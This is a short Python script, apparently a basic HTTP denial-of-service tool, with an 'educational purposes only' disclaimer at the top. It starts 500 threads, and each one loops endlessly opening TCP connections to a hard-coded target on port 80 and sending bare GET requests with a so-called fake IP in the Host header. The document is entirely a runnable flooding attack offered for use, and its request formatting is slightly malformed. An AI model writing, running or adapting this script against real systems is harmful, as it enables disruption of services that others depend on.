#Warning attacking any systems other than your own is illegal. This script is for educational purposes only. The creator takes no responsibility
# for others actions. 

import threading 
import socket


#specify target 
target = '192.168.0.1'
port = 80
fake_ip = '10.10.10.10'


connections = 0

#endless loop
def attack():
	while True: 
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()

		#print connetions 
		global connections
		connections += 1
		print(connections)

# threading 
for i in range(500):
	thread = threading.Thread(target=attack)
	thread.start()
